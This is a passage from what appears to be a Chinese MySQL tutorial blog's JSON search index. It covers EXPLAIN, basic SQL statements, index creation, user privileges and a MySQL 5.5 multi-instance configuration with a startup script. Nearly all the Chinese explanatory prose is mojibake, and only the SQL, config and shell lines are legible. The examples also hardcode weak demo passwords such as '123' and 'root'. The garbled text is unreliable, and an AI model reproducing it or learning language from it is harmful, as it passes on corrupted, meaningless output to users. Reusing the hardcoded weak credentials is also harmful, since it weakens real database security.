possible_keys:Â æŒ‡å‡ºMySQLèƒ½ä½¿ç”¨å“ªä¸ªç´¢å¼•åœ¨è¯¥è¡¨ä¸­æ‰¾åˆ°è¡ŒÂ key:Â æ˜¾ç¤ºMySQLå®é™…å†³å®šä½¿ç”¨çš„é”®(ç´¢å¼•)ã€‚å¦‚æœæ²¡æœ‰é€‰æ‹©ç´¢å¼•,é”®æ˜¯NULLã€‚Â key_len:Â æ˜¾ç¤ºMySQLå†³å®šä½¿ç”¨çš„é”®é•¿åº¦ã€‚å¦‚æœé”®æ˜¯NULL,åˆ™é•¿åº¦ä¸ºNULLã€‚Â ref:Â æ˜¾ç¤ºä½¿ç”¨å“ªä¸ªåˆ—æˆ–å¸¸æ•°ä¸keyä¸€èµ·ä»è¡¨ä¸­é€‰æ‹©è¡Œã€‚Â rows:Â æ˜¾ç¤ºMySQLæ‰§è¡ŒæŸ¥è¯¢æ—¶æ‰«æçš„è¡Œæ•°Â Extra:Â MySQLè§£å†³æŸ¥è¯¢çš„è¯¦ç»†ä¿¡æ¯ Distinct:MySQLå‘ç°ç¬¬1ä¸ªåŒ¹é…è¡Œå,åœæ­¢ä¸ºå½“å‰çš„è¡Œç»„åˆæœç´¢æ›´å¤šçš„è¡Œã€‚ Not exists:MySQLèƒ½å¤Ÿå¯¹æŸ¥è¯¢è¿›è¡ŒLEFT JOINä¼˜åŒ–,å‘ç°1ä¸ªåŒ¹é…LEFT JOINæ ‡å‡†çš„è¡Œå,ä¸å†ä¸ºå‰é¢çš„çš„è¡Œç»„åˆåœ¨è¯¥è¡¨å†…æ£€æŸ¥æ›´å¤šçš„è¡Œã€‚ range checked for each record (index map: #):MySQLæ²¡æœ‰å‘ç°å¥½çš„å¯ä»¥ä½¿ç”¨çš„ç´¢å¼•,ä½†å‘ç°å¦‚æœæ¥è‡ªå‰é¢çš„è¡¨çš„åˆ—å€¼å·²çŸ¥,å¯èƒ½éƒ¨åˆ†ç´¢å¼•å¯ä»¥ä½¿ç”¨ã€‚ Using filesort:MySQLéœ€è¦é¢å¤–çš„ä¸€æ¬¡ä¼ é€’,ä»¥æ‰¾å‡ºå¦‚ä½•æŒ‰æ’åºé¡ºåºæ£€ç´¢è¡Œã€‚ Using index:ä»åªä½¿ç”¨ç´¢å¼•æ ‘ä¸­çš„ä¿¡æ¯è€Œä¸éœ€è¦è¿›ä¸€æ­¥æœç´¢è¯»å–å®é™…çš„è¡Œæ¥æ£€ç´¢è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚ Using temporary:ä¸ºäº†è§£å†³æŸ¥è¯¢,MySQLéœ€è¦åˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨æ¥å®¹çº³ç»“æœã€‚ Using where:WHERE å­å¥ç”¨äºé™åˆ¶å“ªä¸€ä¸ªè¡ŒåŒ¹é…ä¸‹ä¸€ä¸ªè¡¨æˆ–å‘é€åˆ°å®¢æˆ·ã€‚ Using sort_union(...), Using union(...), Using intersect(...):è¿™äº›å‡½æ•°è¯´æ˜å¦‚ä½•ä¸ºindex_mergeè”æ¥ç±»å‹åˆå¹¶ç´¢å¼•æ‰«æã€‚ Using index for group-by:ç±»ä¼¼äºè®¿é—®è¡¨çš„Using indexæ–¹å¼,Using index for group-byè¡¨ç¤ºMySQLå‘ç°äº†ä¸€ä¸ªç´¢å¼•,å¯ä»¥ç”¨æ¥æŸ¥ è¯¢GROUP BYæˆ–DISTINCTæŸ¥è¯¢çš„æ‰€æœ‰åˆ—,è€Œä¸è¦é¢å¤–æœç´¢ç¡¬ç›˜è®¿é—®å®é™…çš„è¡¨ã€‚ Â  åœ¨nameåˆ—åˆ›å»ºæ™®é€šç´¢å¼•,åœ¨æŸ¥è¯¢ mysql\u003e create index index_name on test(name); mysql\u003e explain select * from test where name=â€˜soulchildâ€™\\G; *************************** 1. row *************************** id: 1 select_type: SIMPLE table: test type: ref possible_keys: index_name key: index_name key_len: 20 ref: const rows: 1 Extra: Using where; Using index å¯ä»¥å¯¹æ¯”å‡ºæœ‰ç´¢å¼•æ—¶ï¼Œåªæ‰«æä¸€è¡Œå°±æŸ¥è¯¢åˆ°ç»“æœäº†ã€‚ ","date":"2019-06-01 19:51","objectID":"/post/327/:0:0","tags":["mysql"],"title":"mysql-explainæŸ¥çœ‹sqlæ‰§è¡Œè¿‡ç¨‹","uri":"/post/327/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"è¯­æ³•ï¼šupdate è¡¨å set å­—æ®µ=æ–°å€¼ where æ¡ä»¶;(ä¸å†™æ¡ä»¶åˆ™æ›´æ”¹æ‰€æœ‰å†…å®¹ï¼Œæ‰€ä»¥æ¡ä»¶ä¸€å®šè¦ç¡®è®¤å¥½) å°†è¡¨ä¸­idä¸º3çš„è®°å½•nameå­—æ®µæ”¹ä¸ºritian mysql\u003eupdate test set name=â€˜ritianâ€™ where id=3; ","date":"2019-06-01 19:50","objectID":"/post/325/:0:0","tags":["mysql"],"title":"mysql-updateä¿®æ”¹","uri":"/post/325/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"é¦–å…ˆåˆ›å»ºä¸‰å¼ è¡¨ å­¦ç”Ÿè¡¨ï¼š create table student( Sno int(10) not null comment â€˜å­¦å·â€™, Sname varchar(16) not null comment â€˜å§“åâ€™, Ssex char(2) not null comment â€˜æ€§åˆ«â€™, Sage tinyint(2) not null default â€˜0â€™ comment â€˜å­¦ç”Ÿå¹´é¾„â€™, Sdept varchar(16) default null comment â€˜å­¦ç”Ÿæ‰€åœ¨ç³»åˆ«â€™, primary key (Sno), key index_Sname (Sname) ) ; è¯¾ç¨‹è¡¨ï¼š create table course( Cno int(10) NOT NULL COMMENT â€˜è¯¾ç¨‹å·â€™, Cname varchar(64) NOT NULL COMMENT â€˜è¯¾ç¨‹åâ€™, Ccredit tinyint(2) NOT NULL COMMENT â€˜å­¦åˆ†â€™, PRIMARY KEY (Cno) ) ; é€‰è¯¾è¡¨ï¼š create table SC ( SCid int(12) not null auto_increment comment â€˜ä¸»é”®â€™, Sno int(10) not null comment â€˜å­¦å·â€™, Cno int(10) not null comment â€˜è¯¾ç¨‹å·â€™, Grade tinyint(2) not null comment â€˜å­¦ç”Ÿæˆç»©â€™, primary key (SCid) ); å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®ï¼š insert into student values(0001,â€˜å°æ˜â€™,â€˜ç”·â€™,18,â€˜è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯â€™); insert into student values(0002,â€˜å°çº¢â€™,â€˜å¥³â€™,25,â€˜ç®¡ç†å­¦â€™); insert into student values(0003,â€˜å°ç²‰â€™,â€˜å¥³â€™,28,â€˜ä¼šè®¡â€™); insert into student values(0004,â€˜å°ç´«â€™,â€˜å¥³â€™,35,â€˜ç½‘ç»œå·¥ç¨‹â€™); insert into student values(0005,â€˜å°ç»¿â€™,â€˜ç”·â€™,28,â€˜å·¥å•†ç®¡ç†â€™); insert into student values(0006,â€˜å°è“â€™,â€˜ç”·â€™,21,â€˜ç‰©æµç®¡ç†â€™); è¯¾ç¨‹è¡¨æ’å…¥æ•°æ®ï¼š insert into course values(1001,â€˜äº‘è®¡ç®—â€™,1); insert into course values(1002,â€˜pythonâ€™,1); insert into course values(1003,â€˜javaâ€™,1); insert into course values(1004,â€˜ç½‘ç»œå·¥ç¨‹â€™,1); insert into course values(1005,â€˜å¤§ä¿å¥â€™,6); é€‰è¯¾è¡¨æ’å…¥æ•°æ®ï¼š insert into sc (Sno,Cno,Grade) values (0001,1001,4); insert into sc (Sno,Cno,Grade) values (0001,1002,3); insert into sc (Sno,Cno,Grade) values (0001,1003,1); insert into sc (Sno,Cno,Grade) values (0001,1004,6); insert into sc (Sno,Cno,Grade) values (0002,1001,3); insert into sc (Sno,Cno,Grade) values (0002,1002,2); insert into sc (Sno,Cno,Grade) values (0002,1003,2); insert into sc (Sno,Cno,Grade) values (0002,1004,8); insert into sc (Sno,Cno,Grade) values (0003,1001,4); insert into sc (Sno,Cno,Grade) values (0003,1002,4); insert into sc (Sno,Cno,Grade) values (0003,1003,2); insert into sc (Sno,Cno,Grade) values (0003,1004,8); insert into sc (Sno,Cno,Grade) values (0004,1001,1); insert into sc (Sno,Cno,Grade) values (0004,1002,1); insert into sc (Sno,Cno,Grade) values (0004,1003,2); insert into sc (Sno,Cno,Grade) values (0004,1004,3); insert into sc (Sno,Cno,Grade) values (0005,1001,5); insert into sc (Sno,Cno,Grade) values (0005,1002,3); insert into sc (Sno,Cno,Grade) values (0005,1003,2); insert into sc (Sno,Cno,Grade) values (0005,1005,9); æŸ¥è¯¢æ‰€æœ‰å­¦ç”Ÿæ‰€é€‰çš„è¯¾ç¨‹ä¸å¯¹åº”çš„æˆç»©ï¼š mysql\u003e select student.Sno,student.Sname,student.Sage,course.Cname,sc.Grade from student,course,sc where student.Sno=sc.sno and course.Cno=sc.Cno order by Sno asc; +â€”â€“+â€”â€”â€“+â€”â€”+â€”â€”â€”â€”â€“+â€”â€”-+ | Sno | SnameÂ | Sage | CnameÂ | Grade | +â€”â€“+â€”â€”â€“+â€”â€”+â€”â€”â€”â€”â€“+â€”â€”-+ |Â 1 | å°æ˜Â |Â 18 | äº‘è®¡ç®—Â |Â 4 | |Â 1 | å°æ˜Â |Â 18 | pythonÂ |Â 3 | |Â 1 | å°æ˜Â |Â 18 | javaÂ |Â 1 | |Â 1 | å°æ˜Â |Â 18 | ç½‘ç»œå·¥ç¨‹Â |Â 6 | |Â 2 | å°çº¢Â |Â 25 | äº‘è®¡ç®—Â |Â 3 | |Â 2 | å°çº¢Â |Â 25 | pythonÂ |Â 2 | |Â 2 | å°çº¢Â |Â 25 | javaÂ |Â 2 | |Â 2 | å°çº¢Â |Â 25 | ç½‘ç»œå·¥ç¨‹Â |Â 8 | |Â 3 | å°ç²‰Â |Â 28 | äº‘è®¡ç®—Â |Â 4 | |Â 3 | å°ç²‰Â |Â 28 | pythonÂ |Â 4 | |Â 3 | å°ç²‰Â |Â 28 | javaÂ |Â 2 | |Â 3 | å°ç²‰Â |Â 28 | ç½‘ç»œå·¥ç¨‹Â |Â 8 | |Â 4 | å°ç´«Â |Â 35 | äº‘è®¡ç®—Â |Â 1 | |Â 4 | å°ç´«Â |Â 35 | pythonÂ |Â 1 | |Â 4 | å°ç´«Â |Â 35 | javaÂ |Â 2 | |Â 4 | å°ç´«Â |Â 35 | ç½‘ç»œå·¥ç¨‹Â |Â 3 | |Â 5 | å°ç»¿Â |Â 28 | äº‘è®¡ç®—Â |Â 5 | |Â 5 | å°ç»¿Â |Â 28 | pythonÂ |Â 3 | |Â 5 | å°ç»¿Â |Â 28 | javaÂ |Â 2 | |Â 5 | å°ç»¿Â |Â 28 | å¤§ä¿å¥Â |Â 9 | +â€”â€“+â€”â€”â€“+â€”â€”+â€”â€”â€”â€”â€“+â€”â€”-+ 20 rows in set (0.00 sec) æŸ¥çœ‹æ‰€æœ‰äººçš„é€‰è¯¾æƒ…å†µ mysql\u003e select student.Sno,student.Sname,course.Cname,course.Cno from student,course,sc where student.Sno=sc.Sno and course.Cno=sc.Cno order by Sno; +â€”â€“+â€”â€”â€“+â€”â€”â€”â€”â€“+â€”â€”+ | Sno | SnameÂ | CnameÂ | CnoÂ | +â€”â€“+â€”â€”â€“+â€”â€”â€”â€”â€“+â€”â€”+ |Â 1 | å°æ˜Â | äº‘è®¡ç®—Â | 1001 | |Â 1 | å°æ˜Â | pythonÂ | 1002 | |Â 1 | å°æ˜Â | javaÂ | 1003 | |Â 1 | å°æ˜Â | ç½‘ç»œå·¥ç¨‹Â | 1004 | |Â 2 | å°çº¢Â | äº‘è®¡ç®—Â | 1001 | |Â 2 | å°çº¢Â | pythonÂ | 1002 | |Â 2 | å°çº¢Â | javaÂ | 1003 | |Â 2 | å°çº¢Â | ç½‘ç»œå·¥ç¨‹Â | 1004 | |Â 3 | å°ç²‰Â | äº‘è®¡ç®—Â | 1001 | |Â 3 | å°ç²‰Â | pythonÂ | 1002 | |Â 3 | å°ç²‰Â | javaÂ | 1003 | |Â 3 | å°ç²‰Â | ç½‘ç»œå·¥ç¨‹Â | 1004 | |Â 4 | å°ç´«Â | äº‘è®¡ç®—Â | 1001 | |Â 4 | å°ç´«Â | pythonÂ | 1002 | |Â 4 | å°ç´«Â | javaÂ | 1003 | |Â 4 | å°ç´«Â | ç½‘ç»œå·¥ç¨‹Â | 1004 | |Â 5 | å°ç»¿Â | äº‘è®¡ç®—Â | 1001 | |Â 5 | å°ç»¿Â | pythonÂ | 1002 | |Â 5 | å°ç»¿Â | javaÂ | 1003 | |Â 5 | å°ç»¿Â | å¤§ä¿å¥Â | 1005 | +â€”â€“+â€”â€”â€“+â€”â€”â€”â€”â€“+â€”â€”+ 20 rows in set (0.00 sec) ","date":"2019-06-01 19:49","objectID":"/post/323/:0:0","tags":["mysql"],"title":"mysql-selectå¤šè¡¨è¿è¡¨æŸ¥è¯¢(2)","uri":"/post/323/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ç®€å•æŸ¥è¯¢ è¯­æ³•ï¼šselect å­—æ®µ,å­—æ®µ from è¡¨å; mysql\u003eselect id,name from test; æ¡ä»¶æŸ¥è¯¢ æŸ¥çœ‹å‰2è¡Œçš„æ•°æ® mysql\u003eselect id,name from test limit 2; æŸ¥çœ‹ç¬¬1æ¡åˆ°ç¬¬3æ¡æ•°æ®(ç¬¬ä¸€æ¡æ˜¯0ï¼Œæ‰€ä»¥æ˜¯0,3) mysql\u003eselect id,name from test limit 0,3; æŒ‰ç…§æŒ‡å®šå†…å®¹æŸ¥è¯¢(å­—ç¬¦ä¸²å†…å®¹éœ€è¦åŠ å¼•å·) mysql\u003eselect id,name from test where name=â€˜soulchildâ€™; å¤šä¸ªæ¡ä»¶æŸ¥è¯¢(andã€orã€\u003eã€\u003cã€=) mysql\u003e select id,name from test where name=â€˜soulchildâ€™ and id=1; æŸ¥è¯¢ç»“æœæ ¹æ®idåˆ—æ’åº ascï¼šå‡åº(é»˜è®¤) descï¼šé™åº mysql\u003eÂ select id,name from test order by id desc; ","date":"2019-06-01 19:47","objectID":"/post/319/:0:0","tags":["mysql"],"title":"mysql-selectæŸ¥è¯¢(1)","uri":"/post/319/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åŸºç¡€åˆ›å»ºè¯­å¥ 1.åˆ›å»ºä¸€å¼ testè¡¨ create table test( id int(4) not null auto_increment, name char(20) not null, primary key(id) ); 2.æ’å…¥ æ–¹æ³•1ï¼šæ’å…¥å¤šæ¡æ•°æ®åœ¨åé¢åŠ é€—å·å’Œæ‹¬å·å³å¯ è¯­æ³•ï¼šinsert into è¡¨å(å­—æ®µå,å­—æ®µå) values(å€¼,å€¼),(å€¼,å€¼); mysql\u003einsert into test(id,name) values(1,â€˜soulchildâ€™); å› ä¸ºidå­—æ®µæ˜¯è‡ªå¢çš„ï¼Œæ‰€ä»¥æ’å…¥æ—¶ä¸å†™idä¹Ÿå¯ä»¥ mysql\u003einsert into test(name) values('xiaoming'); mysql\u003e select * from test; +â€”-+â€”â€”â€”â€“+ | id | name | +â€”-+â€”â€”â€”â€“+ | 1 | soulchild | | 2 | xiaoming | +â€”-+â€”â€”â€”â€“+ 2 rows in set (0.00 sec) æ–¹æ³•2: æŒ‰ç…§è¡¨ç»“æ„é¡ºåºæ’å…¥(å¤šæ¡æ•°æ®åœ¨åé¢åŠ é€—å·å’Œæ‹¬å·å³å¯) è¯­æ³•ï¼šinsert into è¡¨å values(å€¼,å€¼),(å€¼,å€¼); mysql\u003einsert into test values(3,â€˜xiaobaiâ€™); mysql\u003e select * from test; +â€”-+â€”â€”â€”â€“+ | id | nameÂ | +â€”-+â€”â€”â€”â€“+ |Â 1 | soulchild | |Â 2 | xiaomingÂ | |Â 3 | xiaobaiÂ | +â€”-+â€”â€”â€”â€“+ 3 rows in set (0.00 sec) æ’å…¥å¤šæ¡æ•°æ®ä¸¾ä¾‹ï¼š(æ¨è) mysql\u003e insert into test values(1,'soulchild'),(2,'xiaoming'),(3,'xiaobai'),(4,'xiaoli'),(5,'xiaohong');","date":"2019-06-01 19:41","objectID":"/post/310/:0:0","tags":["mysql"],"title":"mysql-insertæ’å…¥","uri":"/post/310/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"1.æ·»åŠ PRIMARY KEYï¼ˆä¸»é”®ç´¢å¼•ï¼‰ è¯­æ³•ï¼šALTER TABLE è¡¨å ADD PRIMARY KEY ( åˆ—åç§° ) mysql\u003eALTER TABLE table_name ADD PRIMARY KEY ( column_name ) æ·»åŠ è‡ªå¢å±æ€§çš„ä¸»é”®ç´¢å¼•ï¼š è¯­æ³•ï¼šalter table è¡¨å change åˆ—åç§° æ–°çš„åˆ—åç§° ç±»å‹ primary key auto_increment; mysql\u003ealter table student change id id int primary key auto_increment; åˆ é™¤ï¼š alter table student modify id int;(æœ‰è‡ªå¢æ—¶,éœ€è¦å…ˆå–æ¶ˆè‡ªå¢) alter table table_nameÂ drop primary key; 2.æ·»åŠ UNIQUE(å”¯ä¸€ç´¢å¼•) æ–¹æ³•1ï¼š è¯­æ³•ï¼šALTER TABLE è¡¨å ADD UNIQUE ( åˆ—åç§°) mysql\u003eALTER TABLE table_name ADD UNIQUE ( column_name) æ–¹æ³•2ï¼š è¯­æ³•ï¼šcreate unique index ç´¢å¼•å on è¡¨å(åˆ—å); mysql\u003ecreate unique index uni_ind_name on student(name); 3.æ·»åŠ INDEX(æ™®é€šç´¢å¼•) è¯­æ³•ï¼šALTER TABLE è¡¨å ADD INDEX index_name ( åˆ—åç§° ) mysql\u003eALTER TABLE table_name ADD INDEX index_name ( column_name ) 4.æ·»åŠ FULLTEXT(å…¨æ–‡ç´¢å¼•) è¯­æ³•ï¼šALTER TABLE è¡¨å ADD FULLTEXT ( åˆ—åç§°) mysql\u003eALTER TABLE table_name ADD FULLTEXT ( column_name) 5.æ·»åŠ å¤šåˆ—ç´¢å¼• æ–¹æ³•1ï¼š è¯­æ³•ï¼šALTER TABLE è¡¨å ADD INDEX index_name ( åˆ—åç§°, åˆ—åç§°, åˆ—åç§° ) mysql\u003eALTER TABLE table_name ADD INDEX index_name ( column1_name, column2_name, column3_name ) æ–¹æ³•2ï¼š è¯­æ³•ï¼šcreate index ç´¢å¼•å on è¡¨åç§°(åˆ—åç§°,åˆ—åç§°) mysql\u003ecreate index ind_name_dept on student(name,dept); 6.å­—æ®µå¯¹åº”å†…å®¹çš„å‰Nä¸ªå­—ç¬¦åˆ›å»ºæ™®é€šç´¢å¼• è¯­æ³•ï¼šcreate index ç´¢å¼•åç§° on è¡¨åç§° ( åˆ—åç§°(N)) mysql\u003ecreate index index_name on table_name(column_name(8)); åˆ é™¤ç´¢å¼•ï¼š æ–¹æ³•1ï¼š è¯­æ³•ï¼šdrop index ç´¢å¼•åç§° on è¡¨å; mysql\u003edrop index ind_name_dept on student; æ–¹æ³•2ï¼š è¯­æ³•ï¼šalter table è¡¨å drop index ç´¢å¼•å; mysql\u003ealter table student drop index index_name; ","date":"2019-06-01 19:39","objectID":"/post/306/:0:0","tags":["mysql"],"title":"mysql-æ·»åŠ åˆ é™¤ç´¢å¼•","uri":"/post/306/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"all privilegesæƒé™åˆ—è¡¨ Â  SELECT==\u003eæŸ¥è¯¢ INSERT==\u003eæ’å…¥ UPDATE==\u003eæ›´æ–° DELETE==\u003eåˆ é™¤åº“ã€è¡¨ CREATE==\u003eåˆ›å»ºåº“ã€è¡¨ DROP==\u003eåˆ é™¤åº“ã€è¡¨ REFERENCES==\u003e INDEX==\u003eç´¢å¼• ALTER==\u003eä¿®æ”¹ CREATE TEMPORARY TABLES==\u003eåˆ›å»ºä¸´æ—¶è¡¨ LOCK TABLES==\u003eé”è¡¨ EXECUTE==\u003eæ‰§è¡Œ CREATE VIEW==\u003eåˆ›å»ºè§†å›¾ SHOW VIEW==\u003eæŸ¥çœ‹è§†å›¾ CREATE ROUTINE==\u003eåˆ›å»ºå­˜å‚¨è¿‡ç¨‹ ALTER ROUTINE==\u003eä¿®æ”¹å­˜å‚¨è¿‡ç¨‹ EVENT==\u003eäº‹ä»¶ TRIGGER==\u003eè§¦å‘å™¨ ","date":"2019-06-01 19:36","objectID":"/post/302/:0:0","tags":["mysql"],"title":"mysql  all privilegesæƒé™","uri":"/post/302/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æ•°æ®æŸ¥è¯¢è¯­è¨€(DQL) selectï¼šæŸ¥è¯¢ whereï¼šæ¡ä»¶ order by:æ’åº descï¼šå€’åº ascï¼šæ­£åº group by having ã€‚ã€‚ã€‚ æ•°æ®æ“ä½œè¯­è¨€(DML) ä¸€èˆ¬ç”¨äºå¤„ç†è¡¨ä¸­çš„æ•°æ® insertï¼šæ’å…¥ updateï¼šä¿®æ”¹ deleteï¼šåˆ é™¤ delete from mysql.user where user=â€˜testâ€™;(åˆ é™¤mysqlåº“userè¡¨ä¸­ï¼Œuserå­—æ®µå†…å®¹ä¸ºtestçš„è®°å½•) ã€‚ã€‚ã€‚ äº‹åŠ¡å¤„ç†è¯­è¨€(TPL)Â â€»â€»â€» DMLè¯­å¥æ‰§è¡Œå®Œåï¼Œå°†å½±å“çš„å†…å®¹æ›´æ–°åˆ°æ•°æ®åº“ä¸­ commit rollback ã€‚ã€‚ã€‚ æ•°æ®æ§åˆ¶è¯­è¨€(DCL)Â â€»â€»â€» å¦‚æˆæƒç­‰æ“ä½œ grantï¼šè®¾ç½®æƒé™ revokeï¼šæ”¶å›æƒé™ ã€‚ã€‚ã€‚ æ•°æ®å®šä¹‰è¯­è¨€(DDL)Â â€»â€»â€» createï¼šåˆ›å»ºåº“ã€è¡¨ dropï¼šåˆ é™¤åº“ã€è¡¨ alterï¼šä¿®æ”¹ ã€‚ã€‚ã€‚ æŒ‡é’ˆæ§åˆ¶è¯­è¨€(CCL) ç•¥ ","date":"2019-06-01 19:36","objectID":"/post/300/:0:0","tags":["mysql"],"title":"mysqlåŸºç¡€sqlè¯­å¥(1)","uri":"/post/300/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºä¸åŒç¼–ç çš„æ•°æ®åº“ utf8ï¼š create database soulchild_utf8 default character set utf8Â collate utf8_chinese_ci; gbkï¼š create database soulchild_gbk default character setÂ gbkÂ collate gbk_chinese_ci; æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼š show databases; æ ¹æ®æ¡ä»¶æŸ¥æ‰¾æ•°æ®åº“ï¼š show databases like â€˜soulchild%â€™; æŸ¥çœ‹å½“å‰æ•°æ®åº“çš„è¡¨ï¼š show tables; æŸ¥è¯¢mysqlåº“ä¸­userè¡¨çš„ï¼Œuserã€hostå­—æ®µselectÂ userÂ ,hostÂ fromÂ mysql.user; æŸ¥çœ‹æŒ‡å®šæ•°æ®åº“çš„è¡¨ï¼š show tables in xxx; show tables like â€˜xxxâ€™; show tables from xxx; æŸ¥çœ‹å½“å‰æ‰€åœ¨æ•°æ®åº“ï¼š select database(); æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ï¼š select version(); æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼š select user(); æŸ¥çœ‹å½“å‰æ—¶é—´ï¼š select now(); åˆ é™¤æ•°æ®åº“ï¼š drop database soulchild; è¿›å…¥æ•°æ®åº“ï¼š use soulchild; åˆ é™¤ç”¨æˆ·: æ–¹æ³•1. dropÂ user â€˜soulchildâ€™@â€™localhostâ€™; flush privileges; æ–¹æ³•2. delete from mysql.user where user=â€˜soulchildâ€™ and host=â€˜localhostâ€™; flush privileges; åˆ›å»ºç”¨æˆ· æ–¹æ³•1.(åˆ›å»ºsoulchildç”¨æˆ·ï¼Œå…è®¸10.0.0ç½‘æ®µè®¿é—®ï¼Œå¯†ç ä¸º123) createÂ userÂ soulchild@'10.0.0.%'Â identifiedÂ byÂ '123'; flush privileges; æ–¹æ³•2.(åˆ›å»ºsoulchildç”¨æˆ·ï¼Œå¯¹db1åº“æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œå…è®¸localhostè®¿é—®ï¼Œå¯†ç ä¸º123) grant all on db1.* to 'soulchild'@'localhost' identified by '123' flush privileges; æŸ¥çœ‹ç”¨æˆ·æƒé™ show grants forÂ soulchild@'localhost'; æ”¶å›æƒé™ revoke delete on wordpress.* from 'soulchild'@'10.0.0.%'; ä¿®æ”¹ç”¨æˆ·å¯†ç æ–¹æ³•1. alterÂ userÂ soulchild@â€˜10.0.0.%â€™Â identifiedÂ byÂ â€˜456â€™;Â æ–¹æ³•2. update mysql.user set password=password('456') where user='soulchild'; å»ºè¡¨ #å­—æ®µåÂ ç±»å‹Â æ˜¯å¦ä¸ºç©ºÂ defaulté»˜è®¤å€¼ create table student( id int(4) not null, name char(20) not null, age tinyint(2) not null default '0', dept varchar(16) default null ); æ¸…ç©ºä¸€å¼ è¡¨ truncate table test; ","date":"2019-06-01 19:34","objectID":"/post/296/:0:0","tags":["mysql"],"title":"mysqlåŸºç¡€sqlè¯­å¥(2)","uri":"/post/296/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åœæ­¢å•å®ä¾‹è¿›ç¨‹ pkill mysqld ","date":"2019-06-01 19:32","objectID":"/post/293/:0:1","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"åˆ›å»ºç›®å½•ç»“æ„ [root@db01 ~]# tree /data/ /data/ â”œâ”€â”€ 3306 â”‚Â â”œâ”€â”€ data â”‚Â â”œâ”€â”€ my.cnf â”‚Â â””â”€â”€ mysql â””â”€â”€ 3307 â”œâ”€â”€ data â”œâ”€â”€ my.cnf â””â”€â”€ mysql ","date":"2019-06-01 19:32","objectID":"/post/293/:0:2","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"my.cnfé…ç½®æ–‡ä»¶å†…å®¹ [client] port = 3306 socket = /data/3306/mysql.sock [mysql] no-auto-rehash [mysqld] user = mysql port = 3306 socket = /data/3306/mysql.sock basedir = /application/mysql datadir = /data/3306/data open_files_limit = 1024 back_log =600 max_connections = 800 max_connect_errors = 3000 table_cache = 614 external-locking = FALSE max_allowed_packet = 8M sort_buffer_size = 1M join_buffer_size = 1M thread_cache_size = 100 thread_concurrency = 2 query_cache_size = 2M query_cache_limit = 1M query_cache_min_res_unit = 2K #default_table_type = InnoDB thread_stack = 192K #transaction_isolation = READ-COMMITTED tmp_table_size = 2M max_heap_table_size = 2M long_query_time = 1 pid-file = /data/3306/mysql.pid relay-log = /data/3306/relay-bin relay-log-info-file = /data/3306/relay-log.info binlog_cache_size = 1M max_binlog_cache_size = 1M max_binlog_size = 2M key_buffer_size = 16M read_buffer_size = 1M read_rnd_buffer_size = 1M bulk_insert_buffer_size = 1M lower_case_table_names = 1 skip-name-resolve slave-skip-errors = 1032,1062 replicate-ignore-db = mysql server-id = 1 innodb_additional_mem_pool_size = 4M innodb_buffer_pool_size = 32M innodb_data_file_path = ibdata1:128M:autoextend innodb_file_io_threads = 4 innodb_thread_concurrency = 8 innodb_flush_log_at_trx_commit = 2 innodb_log_buffer_size = 2M innodb_log_file_size = 4M innodb_log_files_in_group = 3 innodb_max_dirty_pages_pct = 90 innodb_lock_wait_timeout = 120 innodb_file_per_table = 0 [mysqldump] quick max_allowed_packet = 2M [mysqld_safe] log-error = /data/3306/mysql_3306.err pid-file = /data/3306/mysqld.pid éœ€è¦ä¿®æ”¹æ–‡ä»¶ä¸­çš„ç«¯å£å·å’Œserver-id mysqlå¯åŠ¨è„šæœ¬ #!/bin/sh #init port=3306 mysql_user=\"root\" mysql_pwd=\"root\" CmdPath=\"/application/mysql/bin\" mysql_sock=\"/data/${port}/mysql.sock\" #startup function function_start_mysql() { if [ ! -e \"$mysql_sock\" ];then printf \"Starting MySQL...\\n\" /bin/sh ${CmdPath}/mysqld_safe --defaults-file=/data/${port}/my.cnf 2\u0026gt;\u0026amp;1 \u0026gt; /dev/null \u0026amp; else printf \"MySQL is running...\\n\" exit fi } #stop function function_stop_mysql(){ if [ ! -e \"$mysql_sock\" ];then printf \"MySQL is stopped...\\n\" exit else printf \"Stoping MySQL...\\n\" ${CmdPath}/mysqladmin -u ${mysql_user} -p${mysql_pwd} -S /data/${port}/mysql.sock shutdown fi } #restart function function_restart_mysql(){ printf \"Restarting MySQL...\\n\" function_stop_mysql sleep 2 function_start_mysql } case $1 in start) function_start_mysql ;; stop) function_stop_mysql ;; restart) function_restart_mysql ;; *) printf \"Usage: /data/${port}/mysql {start|stop|restart}\\n\" esac å¯åŠ¨è„šæœ¬éœ€è¦ä¿®æ”¹æ–‡ä»¶ä¸­çš„ç«¯å£å·ï¼Œç®¡ç†ç”¨æˆ·å’Œå¯†ç  ","date":"2019-06-01 19:32","objectID":"/post/293/:0:3","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä¿®æ”¹ç›®å½•ç®¡ç†æƒé™ chown -R mysql.mysql /data ","date":"2019-06-01 19:32","objectID":"/post/293/:0:4","tags":["mysql"],"title":"mysql5.5.32é…ç½®å¤šå®ä¾‹","uri":"/post/293/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"æ·»åŠ å¯åŠ¨è„šæœ¬æ‰§è¡Œæƒé™ find /data/ -type f -name mysql | xargs chmod +x ","date":"2019-06-01 